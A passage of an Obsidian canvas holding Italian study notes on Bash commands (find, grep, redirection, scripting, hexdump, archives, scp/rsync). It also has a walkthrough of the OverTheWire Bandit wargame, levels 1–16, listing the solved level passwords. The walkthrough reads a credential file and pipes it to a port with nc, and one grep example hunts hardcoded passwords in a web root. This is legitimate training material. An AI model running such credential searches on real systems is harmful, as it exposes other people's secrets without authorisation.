{
	"nodes":[
		{"id":"ea0a31adef225299","type":"text","text":"# Level 1, 2, 3, 4, 5\n\n1. Il file si chiama `-`, se provi a fare `cat -` ovviamente quello si aspetta che stai per scrivere un'opzione. Io ho risolto facendo `cp - /tmp/hello` (non avevo i permessi per scrivere altrove, `/tmp` è stato il best guess) e poi leggendo `cat /tmp/hello`.\n\n```\n263JGJPfgU6LtdEvgfWU1XP5yac29mFx\n```\n\n2. La difficoltà sarebbe che il file contiene spazi. A parte che se scrivi `cat s` e poi fai `tab` ti scrive già tutto in automatico, ma in caso te lo scordi puoi mettere l'escape character (`\\ `) oppure il nome tra virgolette (`cat 'spaces in this filename'`).\n\n```\nMNk8KNH3Usiio41PRUEoDFPqfxLPlSmx\n```\n\n3. I file nascosti si vedono con `ls -a`.\n\n```\n2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ\n```\n\n4. Come prima, visto che i file cominciano con `-` tocca trovare un altro modo, tipo `cat ./-file00`. Non mi andava di controllarli uno per uno: sotto parliamo di ***script bash***.\n\n```\n4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw\n```\n\n5. Qui il punto è: posso anche fare `for f in ./*; do ls -la ./$f; done | grep 1033`, e in effetti esce un unico file, il problema è che non mi dà il percorso (solo il nome!). Non so se ci sono modi per far stampare il percorso a `ls`, ma nel dubbio `du` lo fa già in modo nativo. Quindi `du -ab | grep 1033` (`-a` per stampare tutti i file e `-b` per le dimensioni in `byte`), restituisce `1033    ./maybehere07/.file2`, quindi `cat`. ***Oppure*** banalmente `find . -size 1033c`!! (non io che mi complico la vita).\n\n```\nHWasnPhtq9AVKe0dmk45nxy20cvUa6EG\n```","x":2820,"y":1027,"width":759,"height":859,"color":"4"},
		{"id":"d8bd274b8f96df69","type":"text","text":"# Bash - Enumerare e Leggere Cose\n\nAnzitutto bisogna capire ***cosa c'è*** nella directory, con ***`ls`***. `-l` mostra i dettagli dei vari file: `permessi #hard_link proprietario gruppo dimensione(byte) ultima_modifica nome`.\n\n - Posso ordinare i file per dimensione (`-lS`) o per ultima modifica (`-lt`)\n- Altre opzioni rilevanti sono `-a` (mostra anche i file nascosti), `-R` (mostra in modo ricorsivo il contenuto di tutte le sotto-directory), `-h` (`dimensione` viene tradotta in un formato più leggibile, e.g. `Kb`, `Gb`), `-d` (mostra solo le directory), `-i` (mostra gli ***inode*** dei file) e `-1` (mostra i file in una sola colonna, utile per creare liste);\n- Posso anche combinarlo con altri comandi per filtrare l'output:\n\t- ``ls -lhS | head -n 10`` mostra i 10 file più pesanti in formato leggibile;\n\t- `ls -l *.txt` mostra solo i file con estensione `.txt` (senza usare `grep`!).\n\nUna volta capito cosa c'è, la prossima domanda può essere ***cosa c'è dentro ai file***.\n\n- ***`file`*** - Restituisce la ***codifica del contenuto*** di un `file1` (e.g. `ASCII`, `EXIF`). Questo perché ci metto un attimo a salvare un'immagine come `immagine.txt` nonostante non sia affatto un `.txt` (... o un malware come `file.innocuo`);\n- ***`more`*** or ***`less`*** - Entrambi servono per ***mostrare il contenuto*** di un `file1`.\n\t- `more` è la versione più datata, stampa una riga per volta e ti fa andare solo avanti;\n\t- `less` è una sorta di reader integrato (come può essere `nano` per gli editor di testo), permette di andare su e giù e supporta la ricerca (`/parola` per l'occorrenza successiva, `?parola` per quella precedente).\n\t\t- ***`man`*** usa `less` come reader, e pertanto supporta la ricerca in questo modo.\n- ***`head`*** or ***`tail`*** - Non sempre voglio leggere davvero tutto il file. `head` mostra ***solo le prime `10` righe*** (`-n N` per mostrarne `N`), `tail` le ***ultime*** `10` (anche qui `-n N`);\n\t- `tail` può seguire in diretta l'evoluzione di un file con `-f` (e.g. `tail -f log.txt | grep \"error\"`, stampa in diretta solo gli errori).\n- ***`cat`*** - Nato originariamente con l'idea di concatenare più file in uno solo (`cat file1 file2 > file3` concatena i file `1` e `2` a formare il `file3`) viene di fatto utilizzato per ***stampare roba*** (`cat file1` mostra il contenuto di `file1` su `stdout`);\n\t- Le opzioni `-n` e `-b` su un singolo `file1` restituiscono rispettivamente il numero di righe di `file1` ed il numero di righe non vuote, `-s` stampa `file1` riducendo ogni `N` righe vuote consecutive ad una sola;\n\t- Ha una utile variante `tac` per ***stampare i file al contrario***!\n\t- Va facilmente in combo con i comandi di lettura di prima (e.g. `cat file1 | less`).\n","x":2820,"y":-166,"width":759,"height":957,"color":"4"},
		{"id":"7be47aaf1eeeeb0d","type":"text","text":"# Bash - Trovare Cose Velocemente: `locate`\n\nMentre `find` scorre ogni volta tutto l'albero del `filesystem`, `locate` costruisce e aggiorna periodicamente (ma ***non istantaneamente***!) un DB con le posizioni delle cose. \n\nSe cerco una roba che sta correttamente nel DB, `locate` è velocissima. Supporta le regex (se metto prima `-r`), come opzioni abbiamo `-i` (ignora `uppercase`), `-c` (mostra solo il numero di occorrenze trovate), `-b` (ricerca esatta, tipo `-w` di `grep`.\n\nPer aggiornare manualmente il DB, `sudo updatedb`.","x":3829,"y":1028,"width":759,"height":279,"color":"4"},
		{"id":"4e494b0e134ff4a7","type":"text","text":"# Bash - Trovare Cose nel `filesystem`: `find`\n\nForse il comando più potente di Linux. Per ***trovare `file` nel `filesystem`*** abbiamo\n\n```bash\nfind [path] [options] [criteria]\n```\n\n`[path]` è autoesplicativo: è il punto di partenza della ricerca. `[options]` e `[criteria]` vanno tipicamente insieme, perché posso cercare basandomi su\n\n- `-type` - il ***tipo*** di file. I più comuni sono `f` per i file \"standard\", `d` per le directory, `l` per i link simbolici, `c` per i file a caratteri (e.g. `/dev/tty`, terminale, o `/dev/random`,  generatore di numeri casuali), `b` per i file a blocchi (e.g. le partizioni come `/dev/sda` o `/dev/loop0`), `p` per i file `pipe` utili a far comunicare i processi tra loro ed `s` per i file di tipo `socket` (e.g. `Docker` si comporta come una specie di server interno al computer, ed ha un file `socket` a cui i processi devono mandare le richieste);\n\t- `-type` ricerca sostanzialmente sul tipo di ***inode***.\n- `-name` -  il ***nome*** del file. Come sintassi abbiamo `find /path -name \"criteri\"`;\n\t- Dentro i criteri posso usare le ***wildcard*** (o ***pathname expansions***) del `bash`:\n\t\t- `*` indica un numero qualsiasi di caratteri, `?` un singolo carattere, `{a, b}` esegue due comandi, uno per `a` e uno per `b` (e.g. `ls {giochi, libri}` legge sia la cartella `giochi` che la cartella `libri`);\n\t\t- `find / *_doc??.txt` cerca in tutto il `filesystem` tutti i file che iniziano con qualcosa (anche nulla!), poi hanno `_doc`, poi due caratteri qualsiasi e finiscono per `.txt`.\n\t- La variante `-iname` ignora la distinzione tra maiuscole e minuscole.\n- `-size` - la ***dimensione*** del file. Posso specificare una grandezza esatta o scrivere `+1G` (più grandi di `1 Gb`) e `-10M` (più piccoli di `1 MB`). Abbiamo `c` per i `byte` e `k` per i `kb`;\n- `-?time` - A seconda di `?` abbiamo una ricerca sui file `modificati` (`-mtime`, se ci riferiamo ai soli metadati abbiamo `-ctime`) e `letti` (`-atime`) negli ultimi  `tot` giorni;\n\t- `find /tmp -atime -1` restituisce i file letti nelle ultime 24 ore;\n\t- Varianti `-?min` per questa stessa cosa, ma con `tot` in minuti.\n- `-user`, `-group` - Specifica user e gruppo del file;\n- `-perm` - i ***permessi*** del file. Se cerco permessi specifici posso fare `-perm 400`, ma\n\t- Se mi interessano dei permessi minimi uso `-perm -400` (i.e. `trova tutti i file che possono essere letti dall'owner`) o in modo analogo `-perm -o=r`). In generale abbiamo `owner` (`u`), `group` (`g`), `others` (`o`) o `all` (`a`).","x":3829,"y":-165,"width":759,"height":957,"color":"6"},
		{"id":"625ede0e186681f5","type":"text","text":"# Level 6, 7, 8, 9\n\n6. Questa è una ricerca in tutto il filesystem partendo dalla radice e con criteri di dimensione e permessi. In questo caso è sufficiente `find / -type f -user bandit7 -group bandit6 2>/dev/null`.\n```\nmorbNTDkSW6jIlUc0ymOdMaLnOlFVAaj\n```\n\n7. Questa ricerca è ancora più facile, `cat data.txt | grep \"millionth` o `less data.txt` e poi `/millionth`.\n```\ndfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc\n```\n\n8. Ok. Qua bisogna controllare il numero di occorrenze di un botto di roba. `grep -c` fa esattamente questo. Enumeriamo le righe con un `cat` in un ciclo `for` e stampiamo la riga che compare esattamente una volta:\n```bash\nfor line in $(cat data.txt); do if [[ $(grep -c \"$line\" data.txt) = 1 ]]; then echo $line; fi; done\n```\n- Questo ovviamente l'ho scritto prima di conoscere il comando `uniq`, che elimina le righe duplicate, ma ***adiacenti***. Fare `uniq -u data.txt` è quindi inutile, ma anche `sort -u` per qualche motivo non funziona. L'unico modo che ho trovato per farlo funzionare è `sort data.txt | strings | uniq -u`, una volta appurato che `sort` da solo funziona e che `strings` a quanto pare rende il tutto comprensibile per `uniq`. Vabbè, la chiave è\n\n```\n4CKMh1JI91bUIZZPXDqGanal4xvAg0JM\n```\n\n9. Facile, `strings data.txt | grep \"===\"`.\n\n```\nFGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey\n```","x":4838,"y":1028,"width":759,"height":858,"color":"4"},
		{"id":"2e2f2fffcb29a514","type":"text","text":"# Bash - Trovare Cose nei `file`: `grep`\n\n`grep - Global Regular Expression Print` è un altro dei comandi più potenti di Linux. ***Trova cose dentro ai file***.\n\n```bash\ngrep [options] pattern [file(s)]\n```\n\n`pattern` è una ***stringa*** o una ***regex***.\n\n- `pattern = \"^error\"` restituirà solo le occorrenze di `error` ad inizio riga. Analogo `\"error$\"` a fine riga;\n- `.` rappresenta un qualsiasi carattere singolo, `*` significa `0 o più occorrenze`, `[]` delimitano una classe di caratteri (e.g. `[0-9]*` significa `qualsiasi numero di cifre`);\n- Le parentesi `()` si usano per definire i gruppi di caratteri (e.g. `(ab)*`);\n\nPosso specificare più `file(s)` con le `wildcards`, mentre le opzioni...\n\n- `Ax`, `-By` - Mostrano rispettivamente `x` righe dopo il match e `y` righe prima;\n- `-c` - Restituisce il numero di righe che contengono il `pattern`;\n- `-E` estende le regex, permettendo di usare gli operatori `+` (`1 o più occorrenze`), `?` (`nessuno o un carattere qualsiasi`) e `|` (`OR logico`);\n- `-o` - Mostra solo il match, non l'intera riga (utile se faccio una ricerca con una regex);\n- `-i` - Ignora la differenza tra maiuscole e minuscole;\n- `-r` - Ricerca ricorsivamente in tutte le sottodirectory, se `[file(s)]` è una `directory`;\n- `-v` - Inverte la ricerca, i.e. mostra solo le righe che ***non*** contengono `pattern`;\n- `-l` - Mostra solo i nomi dei file che contengono il pattern (e.g. utile con `-r`);\n\t- `-H` invece mostra ***anche*** il nome del file.\n- `-n` - Restituisce il numero di riga a cui è stato trovato il `pattern`;\n- `-w` - Trova solo le occorrenze esatte di `pattern` (e.g. mentre di norma se cerco `error` trovo anche cose tipo `error10`, con `-w` mi limito alle sole occorrenze di `error` isolato).\n\n<span style=\"color:rgb(236, 155, 14)\">fgrep, egrep??</span>\n","x":4838,"y":-165,"width":759,"height":957,"color":"3"},
		{"id":"19241c3faaf980ec","type":"text","text":"# Level 10, 11, 12\n\n10. Per decodificare `base64` abbiamo il comando... `base64 -d`.\n```\ndtR173fZKb0RRsDFSGsg2RWnpNVj3qRr\n```\n\n11. Implementiamo il cifrario di Cesare con chiave 13 (anche detto `rot13`, che per qualche strano motivo non ha una funzione che lo implementa direttamente, tocca usare `tr`).\n\n```\n7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4\n```\n\n12. Creiamo una cartella temporanea con `mktemp /tmp/mydir.XXX`. Non posso leggere `/tmp`, ma posso attraversarla. Copio `data.txt` in `mydir.ABC` e lo leggo. La prima riga dell'`hexdump` mi dice che è stato compresso con `gzip` (magic number `1f 8b`), quindi `xxd -r data.txt > unhex.txt.gz` (gli devi mettere l'estensione giusta, altrimenti si lamenta) per ricostruire il file compresso originale e `gunzip unhex.txt.gz` per estrarre `unhex.txt`. Costui è di nuovo un file binario, e non abbiamo idea della codifica in cui è scritto, quindi di nuovo `hexdump` (o `xxd`). Sorpresa! `42 5a` (che tra l'altro codificano `BZ` in `ASCII`), quindi rifacciamo lo stesso giochino con `bzip2`. Pensavo di aver finito, ma no! `1f 8b` è di nuovo il magic number di `gzip`. Ripetiamo.\n- Questo era il primo tentativo. Al secondo non mi faceva leggere la cartella `mydir.XXX`, boh. Ho trovato una cartella in cui potevo sia leggere che scrivere (`/run/lock`), ci ho abusivamente fatto una cartella e ho ricominciato il giochino di prima, stavolta usando `file` per controllare il formato dei risultati (invece dei magic numbers...). Così facendo scopriamo che il punto dove pensavo di aver finito al primo tentativo era in realtà metà del lavoro, perché quello era un file `.tar`! E poi `.gz`, e poi di nuovo `.tar`... Insomma, tutta così fino a `gunzip -c data8.bin.gz`, che contiene la `password`.\n\t- Nota per quando leggi l'`hexdump`: il primo archivio non aveva magic number noto, ma si potevano vedere i nomi dei file in esso contenuti, nella colonna `ASCII`!\n\n```\nFO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn\n```","x":5847,"y":1029,"width":759,"height":857,"color":"4"},
		{"id":"df5e2abc8ea4b780","type":"text","text":"# Esempi di `grep`\n\n```bash\n# Stampa hello, hello123, hellothere\necho \"hello world, hello123, hellothere\" | grep -Eo 'hello\\w*'\n\n# Mostra solo i processi relativi a Firefox\nps aux | grep firefox\n\n# Estrae i soli numeri da un testo\necho \"ID: 123, User: 456, Code: 789\" | grep -Eo '[0-9]+'\n\n# Estrae i soli indirizzi IP da un file di log\ngrep -Eo \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" access.log\n\n# Estrae i soli indirizzi email da un file\ngrep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' file.txt\n\n# Trova password hardcoded\ngrep -r \"password\" /var/www/html/\n```","x":5847,"y":-165,"width":759,"height":957,"color":"3"},
		{"id":"3565595bf897b446","type":"text","text":"# Trasferire `files` in/da Remoto\n\nCi sono diverse alternative per copiare roba dal server remoto alla macchina da cui parte la connessione. Assumendo di conoscere il percorso dei file che mi interessano, posso\n\n- Loggare `ssh`, `cat` sui file che mi interessano e fare copia manuale. Se (come per il `livello 13`) devo copiare roba delicata come una chiave `RSA`, non è ottimale: potrei perdere informazioni di formattazione; \n- Usare il `Secure Copy Protocol` con sintassi `scp user@server:/file/on/server /target/on/my/pc` (per copiare qualcosa dal tuo pc al server inverti `source` e `target`). Ha opzioni per trasferire intere cartelle (`-r`) e per per farlo con compressione (`-C`);\n\t- ***Conviene usarlo se devo trasferire un solo file di cui conosco il path***.\n- Usare `Remote Sync`, sintassi `rsync user@server:/file/on/server /target/on/my/pc` (idem per l'inversione);\n\t- Un'***opzione*** molto interessante è ***`-a`***, che ***mantiene permessi***, timestamp e symlink. Mi conviene metterla perché `ssh` è schizzinoso, e accetta solo chiavi private con permessi `600` (i.e. solo il proprietario può fare `r/w`);\n\t- `-u` evita di sovrascrivere file con timestamp più recente;\n\t- `-v` (`verbose`) dà più info sul trasferimento;\n\t- `-z` comprime i file prima di inviarli;\n\t- Se usi il server come backup ed elimini un file in locale, al prossimo `rsync` vorresti che venga eliminato anche in remoto. Per questo esiste l'opzione `--delete`;\n\t- Se avevi iniziato un grosso trasferimento ma poi è saltata la luce, puoi ripetere il comando dicendogli di recuperare i dati che aveva già scaricato con `--partial`;\n\t- ***Conviene usarlo se ho tanta roba da trasferire***;\n- Usare `Secure File Transfer Protocol`. `sftp user@server` apre una connessione `SFTP` che si traduce in una shell interattiva che collega due `directory`: quella del `server`, nel quale navigo normalmente con i comandi della shell, e quella dell'`host`, nel quale navigo con gli stessi comandi con una `l` davanti (e.g. `lcd`, `lls`, ...);\n\t- Ho i comandi tipici di `FTP`: `get file_on_server.txt`, `put file_on_host.txt`;\n\t- Aggiungo `-r` per scaricare intere cartelle;\n\t- Uso `mget [files]` ed `mput [files]` per gestire file multipli;\n\t- Chiudo la connessione con `exit` o con `bye`;\n\t- ***Conviene usarlo se mi interessa navigare nel `server` per cercare cosa trasferire***.\n- Usare `netcat` (`nc`). Vedi il rettangolo più a destra.","x":6857,"y":-165,"width":759,"height":957,"color":"4"},
		{"id":"22b8634d71376455","type":"text","text":"# Level 13, 14, 15\n\n13. Per usare `scp` sulla porta `2220`, `scp -P 2220 [resto del comando]`, mentre per `rsync` bisogna proprio dirgli di usare `ssh` con `rsync [options] -e \"ssh -p 2220\"`. Usiamo il primo. Non c'è `password`, ma ora abbiamo una `private key` in `~/.ssh`.\n14. Anzitutto, `chmod 600 ~/.ssh/sshkey.private` per settare i permessi della chiave privata (che altrimenti `ssh` piange). Quindi procediamo a specificare di usarla, con `ssh -p 2220 -i ~/.ssh/sshkey.private bandit14@bandit.labs.overthewire.org`. La password è in `/etc/bandit_pass/bandit14`, e va mandata a `localhost` sulla porta `30000`. Lo facciamo con `nc -v localhost 30000`, che ci restituisce la `password`.\n\n```\n8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo\n```\n\n15. Qui apriamo una connessione con `openssl` invece che con `nc`. Il comando completo  è `openssl s_client localhost:30001` e poi mandiamo la `password` precedente.\n\n```\nkSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx\n```\n\n16. Grazie ad uno `script` di `nmap` possiamo cercare direttamente le porte che parlano `SSL/TLS`: basta fare `nmap -p 1000-2000 --script ssl-cert localhost`. Ne risultano due server, andando a tentativi troviamo NO, DICE DI FARE KEYUPDATE MA POI SE RINEGOZIO CHIUDE LA CONNESSIONE.\n```\n\n```","x":7866,"y":1029,"width":759,"height":857,"color":"1"},
		{"id":"cc2e7b0b543200e9","type":"text","text":"","x":8600,"y":1920,"width":250,"height":60},
		{"id":"d6df1ebc088bc55b","type":"text","text":"# Crittografia\n\nIl cifrario di ***Cesare*** si può implementare con il comando `tr`:\n\n```bash\n cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'\n```\n\nQuesto in particolare è ***rot13***, perché fa comodo (critta e decritta nello stesso verso).\n\nUna codifica molto comune è `base64` (`-d` per decrittare).\n\n\n\n","x":6857,"y":2118,"width":759,"height":951},
		{"id":"28c7fa5a4a2add1f","type":"text","text":"# Hexdump\n\nI programmi aprono i `file` basandosi sull'estensione, scelgono cosa mostrare o non sono in grado di rappresentare correttamente tutte le informazioni in esso contenute. Questo significa che il vero controllo è sui singoli `byte`. Ma come li leggo?\n\nAnzitutto converto l'intero `file` in binario (o meglio, in esadecimale, che altrimenti è una roba illeggibile). Questa roba si fa con `hexdump`, preferibilmente con opzione `-C`, che stampa un formato più user-friendly di tipo\n\n```\n# OFFSET                # VALORI BYTES                           # ASCII\n0001ff00  50 4b 05 06 00 00 00 00  01 00 01 00 5a 00 00 00  |PK..........Z...|\n```\n\n`OFFSET` indica il primo `byte` che compare in `VALORI BYTES`. Il `byte 1ff00` assume valore esadecimale `50` (`80` in decimale), che in `ASCII` indicizza il carattere `P`. In questo caso, `50 4b` (i.e. `PK`) è il ***magic number*** di un file `.zip`, mentre `05 06` identifica la fine di un file `.zip` (`End of Central Directory Record`).\n\nQuesto per dire che i dati nascosti includono il reale formato del file, indipendentemente dall'estensione che risulta nel `filesystem`. Esempi di magic numbers sono `89 50 4E 47` (`PNG`), `FF D8 FF` (`JPEG`) e `7F 45 4C 46` (`ELF`, i.e. eseguibile Linux), e si trovano all'inizio della prima riga dell'`hexdump`.\n\nAltra cosa comune è individuare la presenza di ***metadati***. Un file `mp3` può ad esempio contenere, oltre alla musica, informazioni quali `titolo`, `artista` e via dicendo. Questi dati vengono spesso ignorati da un `media player`, ma stanno là!\n\n```\n0001fa20  49 44 33 04 00 00 00 00  00 21 54 49 54 32 00 00  |ID3......TIT2..|\n```\n\nIn questo esempio `ID3` rappresenta il formato dei metadati su `mp3`. Questa riga del file di `hexdump` indica che a partire dal `byte 1fa20` troveremo i metadati sulla traccia audio.\n\nAltri esempi di metadati sono i formati `EXIF` (per `JPEG`) e `XMP` (su `PDF Adobe`).\n\nInfine, ovviamente, tutto questo si può usare per nascondere messaggi nei `file`.","x":4838,"y":2118,"width":759,"height":951,"color":"4"},
		{"id":"09449e1e2bf4e019","type":"text","text":"# Interpretare un `hexdump`\n\nTutto molto bello, ma posso fare così solo se sono io ad eseguire `hexdump -C`. Come faccio se trovo un file `hexdump` senza interfaccia user-friendly `-C`?\n\nPosso tornare al file originale con il comando `xxd`. Di per sé fa la stessa cosa di `hexdump`, ma a differenza di quest'ultimo ha una simpatica opzione `-r` per ***tornare indietro***.\n\n```bash\nxxd [opzioni] [file] [output]\n```\n\n- `-p` se hai un input di soli esadecimali (senza impaginazione user-friendly);\n- `-g [N]` ti permette di vedere `N byte` alla volta direttamente tradotti in `ASCII`.","x":4838,"y":3314,"width":759,"height":345,"color":"4"},
		{"id":"fde5e59d70e6ddbe","type":"text","text":"# Compressione e Archiviazione\n\nL'idea alla base della compressione è la seguente: i dati sono spesso ridondanti, posso trovare una ***rappresentazione più compatta*** perdendo poca o nessuna informazione.\n\nIdealmente vorremmo una compressione ***lossless*** (senza perdita di informazione) per cose come codici e file di sistema. Come si ottiene?\n\n- ***Run-Length Encoding*** (***RLE***) - `AAAAAAAAAA` $\\to$ `10A`;\n- ***Dizionari*** - `ABCDABCDABCD` $\\to$ `ABCD[1,4]`;\n- ***Huffman Coding*** - `1010101011111000` $\\to$ `10 = A`, `11 = B`, `00 = C`$\\to$ `AAAABBAC`.\n\nPosso invece applicare compressioni ***lossy*** a file meno importanti (e.g. `jpeg` elimina alcuni dettagli poco visibili). Abbiamo diversi comandi/algoritmi built-in nella shell:\n\n- `gzip` - Compressione rapida, ma non ottimale. `gunzip` torna indietro, se specifico `-k` quando comprimo mantiene anche il file originale. Estensione `.gz`;\n- `bzip2` - Più lento, ma più ottimizzato. `bunzip2` torna indietro. Estensione `.bz2`;\n- `xz` - Lentissimo ma efficientissimo. `unxz` torna indietro. Estensione `.xz`.\n\nPer scegliere il file di destinazione tocca usare l'opzione `-c` (sceglie `stdout` come output) e poi reindirizzare sul file che voglio con un `>` finale.\n\n\"Ma perché vedo spesso la doppia estensione `.tar.gz`?\"\n\nQuesto accade quando si comprime (`.gz`) un ***archivio*** (`.tar`). E che roba è? Se devo mandare file multipli, non posso semplicemente inviare una `directory` (banalmente, lei è solo un'organizzazione logica dei puntatori agli `inodes` del `filesystem` locale). Allora creo un file `archivio` in cui metto tutti i file che voglio mandare. In pratica, è come fosse una `directory`, ma è un `file`. Chiaro, no?\n\nLinux usa tendenzialmente il comando `tar` (`Tape ARchive`) per gestire gli `archivi`.\n\n```bash\ntar [opzioni]\n```\n\n- `-c [input_files]`, `-x` - Rispettivamente, crea ed estrae un archivio. Devo sempre specificarne il nome, con `-f [target]`. Si usano quindi in genere insieme: `tar -cf [target] [input_files]` e `tar -xf [target]`;\n- Può integrare una compressione, usando `gzip` (`-z`), `bzip2` (`-j`) o `xz` (`-J`).","x":5847,"y":2118,"width":759,"height":951,"color":"4"},
		{"id":"04825a06a9d94d59","type":"text","text":"# Bash - Controllo di Flusso\n\n```bash\nfor f in ./*; do echo \"file $f: \"; cat \"$f\"; echo; echo; done\n```\n\nQuesta è la ***concatenazione*** di comandi bash con cui si può risolvere il livello 4. In generale:\n\n- `comando &` esegue il `comando` in ***background***;\n- `c1; c2` esegue prima `c1` e poi `c2`, ***indipendentemente dall'esito*** del primo;\n- `c1 && c2` esegue `c2` solo se `c1` ha ***successo*** (i.e. `exit status 0`);\n- `c1 || c2` esegue `c2` solo se `c1` ***fallisce*** (e.g.  `mkdir prova || echo \"errore\"`).\n\nQualsiasi comando ha due tipologie di output: ***`stdout`*** per i risultati ordinari e ***`stderr`*** per gli errori. Se non viene specificato diversamente, entrambi vengono stampati su terminale. Altrimenti, entriamo nel mondo degli ***operatori di reindirizzamento***:\n\n- `comando > file` sovrascrive `file` con lo `stdout` di `comando`, mentre `comando >> file` lo aggiunge in coda (`append`);\n- `comando 2> file` e `comando 2>> file` discorso analogo, ma con `stderr`;\n\t- Posso anche dare entrambi i comandi insieme, e.g. `comando > file 2> errors` reindirizza `stdout` in `file` e `stderr` in `errors`;\n\t- Molto comune è la scrittura `2> /dev/null`, che reindirizza gli errori in un file che fa le veci di un buco nero in cui tutto viene distrutto (per un output più pulito). \n- `comando &> file` reindirizza entrambi, e anche lui ha il suo analogo in versione `append` con `comando &>> file.log`. Questa sarebbe la forma abbreviata di `comando > output 2>&1`, cioè `metti stdout in output, e stderr dove hai messo stdout`;\n\t- È l'unico caso in bash in cui `&` viene usato come \"puntatore\" (allo stream `1`).\n- `comando < file` usa `file` come input per `comando`;\n- `c1 | c2` esegue `c1`, quindi passa il suo output come input di `c2`.\n\t- I comandi \"telefonati\" da usare con `|` sono `grep` e `tee` (`comando | tee file` mostra l'output di `comando` a schermo e lo salva anche su `file`).\n","x":2820,"y":2117,"width":759,"height":797,"color":"4"},
		{"id":"efbeb23d6fccc658","type":"text","text":"# Script Bash\n\nOgni ***script bash*** inizia con `#!/bin/bash`. Perché? Bash è un ***linguaggio interpretato***, e questo simpatico operatore `#!` (detto ***shebang***, da `sharp (#) + bang (!)` se te lo stessi chiedendo) serve a specificare il percorso dell'interprete da usare. Per capirci, se scrivi `#!/usr/bin/python3` e poi esegui `./script.py`, questo verrà interpretato in automatico da `python3`, senza bisogno di scrivere sulla shell `python3 script.py`. \"Quindi posso non mettere `#!/bin/bash` e scrivere direttamente sulla shell `bash script.sh`?\". Sì, ma basta con le digressioni, andiamo avanti.\n\nTutti questi operatori ci portano con molta naturalezza a voler mettere un botto di comandi in fila utilizzando i costrutti fondamentali di un qualsiasi linguaggio di programmazione.\n\nTutti i costrutti che seguono possono essere scritti come singola riga. In quel caso, gli \"a capo\" si sostituiscono con l'operatore `;`. Partiamo con l'`if` e vediamo un esempio:\n\n```bash\nif [[ condizione ]]; then\n\tcomando1\n\tcomando2\nelif [[ altra condizione ]]; then\n\tcomando3\nelse\n\tcomando4\nfi\n```\n\nChe su una sola riga diventa\n\n```bash\nif [[ condizione ]]; then comando1; comando2; elif [[ altra condizione ]]; then comando3; comando4; else comando4; fi\n```\n\nPuò essere utile `case`, quando mettere troppi `elif` diventa noioso:\n\n```bash\ncase variabile in\n\tpattern1) comando1 ;;\n\tpattern2) comando2 ;;\n\t...\n\t*) comando_default ;;\nesac\n```\n\nSeguono i `loop`: `for`, `while` e poi boh, a qualcuno evidentemente non andava di scrivere `while [[ ! condizione]]` (che continua a girare finché `! condizione` non diventa `True`) e si è inventato `until [[ condizione ]]` (gira finché `condizione` non diventa `False`).\n\n```bash\nfor var in elenco; do\n\tcomando1\n\tcomando2\ndone\n```\n\n```bash\nwhile [[ condizione ]]; do\n    comando1\n    comando2\ndone\n```\n\n```bash\nuntil [[ condizione ]]; do\n    comando1\n    comando2\ndone\n```\n\nIn basso segue come definire le funzioni.","x":3829,"y":2118,"width":759,"height":1541,"color":"4"},
		{"id":"3d73dc291ec51cb6","type":"text","text":"# Bash - Espansioni, Espressioni, Logica\n\nPer avere il quadro completo manca il ruolo del meraviglioso operatore `$`.\n\n- ***`$f`*** (***espansione di variabile***) - Se `f` è una variabile, `$f` sostituisce il suo contenuto;\n- ***`$(comando)`*** (***espansione di comando***) - Ogni `comando` restituisce un certo output. Questa scrittura esegue `comando` e ne utilizza l'output in una espressione;\n- ***`$((algebra))`*** (***espressione algebrica***) - Questa scrittura esegue operazioni di `algebra` elementare. Non si possono innestare comandi (e.g. `du`) al suo interno!\n\nA questo dobbiamo aggiungere l'operatore di ***test logico*** per condizioni booleane. La scrittura è `[[ condizione ]]`, e restituisce il valore `True` o `False` della `condizione`.\n\n- ***Test su `file`*** - La scrittura `-X file` restituisce `True` se, per diversi `-X`, `file`\n\t- esiste (`-e`), è un file (`-f`), è una directory (`-d`), è non-vuoto (`-s`);\n\t- è leggibile (`-r`), scrivibile (`-w`) o eseguibile (`-x`);\n- ***Confronto tra `file`*** - La scrittura `file1 -nt file2` restituisce `True` se `file1` è più nuovo (i.e. ha data di modifica più recente) di `file2` (e viceversa con `-ot`);\n- ***Test su `stringa`*** - `-z str` restituisce `True` se `str` è vuota (non-vuota con `-n`);\n- ***Confronto tra `stringhe`*** - Classici operatori di `=`, `!=`, `>` e `<` (questi ultimi due a livello lessicografico). Molto è interessante è verificare se una `stringa` è il prodotto di una ***regex*** con la condizione `str =~ regex`;\n- ***Confronto tra numeri*** - Classici operatori `-eq`, `-ne`, `-lt` `-le`, `-gt`, `-ge`.\n\nPuoi combinare più `condizioni` secondo gli operatori `&& (AND)`, `|| (OR)` e `! (NOT)`.","x":2820,"y":3013,"width":759,"height":646,"color":"4"},
		{"id":"592cc115c760d58b","type":"text","text":"# Script Bash - Funzioni\n\nCi sono due modi equivalenti di dichiarare le funzioni:\n\n```bash\nfunction nome_funzione {\n    comando1\n    comando2\n}\n```\ne\n```bash\nnome_funzione() {\n    comando1\n    comando2\n}\n```\n\nIn ogni caso, i ***parametri*** non vanno passati tra parentesi.\n\n```bash\nsomma() {\n\techo $(( $1 + $2 ))\n}\n\nsomma 4 5    # Output: 9\n```\n\nIntuitivamente, `$N` è l'`N`-esimo parametro passato, dove `N` può essere qualsiasi (il numero di parametri letti dalla funzione è accessibile con `$#`). Posso poi prendere tutti i parametri insieme e trattarli come ***lista*** (`$@`) o come ***stringa*** (`$*`).\n\n`return` qui rappresenta il codice di uscita, ed è pertanto recuperabile con `$?` (restituisce il codice di uscita dell'ultimo comando eseguito) subito dopo la sua esecuzione.\n\nTutte le variabili dentro le funzioni sono intese come globali, salvo specifica `local`.\n\nUn'applicazione interessante è fare override di comandi noti, e.g.\n\n```bash\nls() {command ls --color=auto \"$@\"}\n\nls   # Usa ls con colori sempre attivi\n```","x":3829,"y":3894,"width":759,"height":935,"color":"4"},
